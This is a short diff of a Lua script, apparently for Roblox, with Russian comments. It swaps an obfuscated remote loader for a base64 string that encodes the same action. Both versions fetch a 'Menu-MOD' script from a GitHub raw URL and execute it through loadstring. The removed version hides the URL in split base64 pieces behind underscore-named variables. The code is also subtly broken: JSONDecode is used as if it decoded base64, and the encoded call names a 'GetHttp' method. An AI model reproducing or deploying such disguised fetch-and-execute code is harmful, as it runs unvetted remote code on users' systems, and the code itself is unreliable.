@@ -1,25 +1,2 @@
--- Вставь этот код в свой GitHub
-local _=(function() return{
-[1]="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3",
-[2]="NlcmV6YW5ldDIvc2VyZXphbmV0Mi1HSVQtU0FMTEkvbWFp",
-[3]="bi9NZW51LU1PRC5sdWE=",
-}(end))
-
-local function __(___)
-    return game:GetService("HttpService"):JSONDecode('"'..___..'"')
-end
-
-local _____ = table.concat(_)
-local ______ = __(_____)
-local _______ = loadstring or load
-
-if not ______ then
-    warn("Ошибка декодирования URL")
-else
-    local ________ = game:HttpGet(______)
-    if ________ then
-        _______(________)()
-    else
-        warn("Не удалось загрузить скрипт")
-    end
-end
+-- Закодированная версия скрипта
+local encoded = "bG9hZHN0cmluZyhnYW1lOkdldEh0dHAoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zZXJlemFuZXQyL3NlcmV6YW5ldDItR0lULVNBTExJL3JlZnMvaGVhZHMvbWFpbi9NZW51LU1PRCIpKSgp"
